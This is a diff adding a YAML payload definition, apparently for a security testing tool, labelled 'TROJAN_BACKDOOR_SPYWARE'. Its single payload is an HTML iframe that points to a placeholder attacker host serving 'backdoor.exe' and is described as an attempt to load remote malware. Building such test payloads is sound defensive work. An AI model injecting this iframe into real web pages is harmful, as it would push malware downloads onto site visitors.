@@ -1,0 +1,7 @@
+name: "TROJAN_BACKDOOR_SPYWARE"
+description: >
+  Attempts to load remote malware.
+payloads:
+  - id: trojan_backdoor_spyware
+    payload: "<iframe src='http://evil.com/backdoor.exe'>"
+    description: Attempts to load remote malware.
